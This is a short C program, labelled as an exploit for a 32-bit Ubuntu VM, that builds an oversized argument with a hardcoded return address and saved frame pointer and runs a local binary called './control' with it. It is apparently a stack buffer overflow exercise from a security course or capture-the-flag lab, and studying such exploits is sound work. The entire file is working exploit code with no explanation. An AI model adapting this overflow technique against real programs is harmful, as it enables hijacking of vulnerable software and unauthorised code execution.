// Exploit for Ubuntu 4 (32 Bit) VM

#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
	char* arg0 = "./control";
	char arg1[529];

	memset(arg1, 0x03, 528);
	arg1[528] = '\0';

	unsigned int addr = 0x080483d7;
	addr = htonl(addr);
	memcpy(arg1, (void*) &addr, 4);

	unsigned int sebp = 0xbffffc98;
	sebp = htonl(sebp);
	memcpy(&arg1[4], (void*) &sebp, 4);

	char* argv[3];
	argv[0] = arg0;
	argv[1] = arg1;
	argv[2] = NULL;
	char* envp[1];
	envp[0] = NULL;

	execve(arg0, argv, envp);

	return 0;
}
